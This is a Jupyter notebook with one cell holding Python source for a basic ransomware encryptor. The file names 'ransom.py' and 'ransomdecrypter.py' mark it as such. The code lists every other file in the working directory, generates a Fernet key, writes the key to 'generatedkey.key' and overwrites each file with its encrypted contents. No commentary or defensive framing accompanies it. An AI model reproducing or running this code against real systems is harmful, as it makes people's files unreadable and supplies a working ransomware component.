{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "import os\n",
    "from cryptography.fernet import Fernet\n",
    "\n",
    "file_list = []\n",
    "\n",
    "for file in os.listdir():\n",
    "    if file == \"ransom.py\" or file == \"generatedkey.key\" or file == \"ransomdecrypter.py\":\n",
    "        continue\n",
    "    if os.path.isfile(file):\n",
    "        file_list.append(file)\n",
    "\n",
    "print(file_list)\n",
    "\n",
    "key = Fernet.generate_key()\n",
    "\n",
    "print(key)\n",
    "\n",
    "with open(\"generatedkey.key\",\"wb\") as generatedkey:\n",
    "    generatedkey.write(key)\n",
    "\n",
    "for file in file_list:\n",
    "    with open(file,\"rb\") as the_file:\n",
    "        contents = the_file.read()\n",
    "    contents_encrypted = Fernet(key).encrypt(contents)\n",
    "    with open(file,\"wb\") as the_file:\n",
    "        the_file.write(contents_encrypted)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
